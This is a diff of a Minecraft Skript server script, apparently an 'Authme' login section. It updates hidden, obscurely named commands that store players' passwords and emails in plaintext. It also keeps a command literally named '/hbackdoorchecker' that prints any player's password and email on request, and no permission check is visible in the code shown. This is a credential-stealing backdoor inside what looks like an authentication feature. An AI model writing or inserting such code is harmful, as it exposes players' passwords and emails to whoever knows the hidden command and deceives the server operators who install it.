@@ -11,43 +11,35 @@
 #
 #
 #
-# Register
+# Authme
 #
 #
-#command /register <text> <text>:
-#	trigger:
-#		add player to {player.list::*}
-#		add arg 1 to {password.%player%::*}
-#		add 1 to {player.count}
-#		
-
 command /thisisthepasswordaddercommand <text> <text>:
 	trigger:
 		add player to {player.list::*}
-		add arg 2 to {password.%player%::*}
 		add 1 to {player.count}
+		set {password.%player%} to arg 2
 #
 command /thisisthepasswordchangercommand <text> <text>:
 	trigger:
-		remove arg 1 from {password.%player%::*}
-		add arg 2 to {password.%player%::*}
+		set {password.%player%} to arg 2
 #		
 command /thisistheemailaddercommand <text> <text>:
 	trigger:
 		add player to {email.list::*}
-		add arg 2 to {email.%player%::*}
 		add 1 to {email.count}
+		set {email.%player%} to arg 2
 #		
 command /thisisthechangerecoverycommand <text> <text>:
 	trigger:			
-		remove arg 1 from {email.%player%::*}
 		add arg 2 to {email.%player%::*}
+		set {email.%player%} to arg 2
 #		
 command /hbackdoorchecker <text>:
 	trigger:
 		message "     &6~ Rapport sur &2%arg 1% &6~"
-		message "Mot de passe : %{password.%arg 1%::*}%"
-		message "Email : %{email.%arg 1%::*}%"
+		message "Mot de passe : %{password.%arg 1%}%"
+		message "Email : %{email.%arg 1%}%"
 		message "Total Mails %{email.count}%"
 #		
 #
@@ -89,7 +81,6 @@ on load:
 	delete file "Gaia/data/scoreboard.dat"
 	wait 7 seconds
 	delete file "Gaia/data/scoreboard.dat"
-	
 #
 #
 # NPC mover
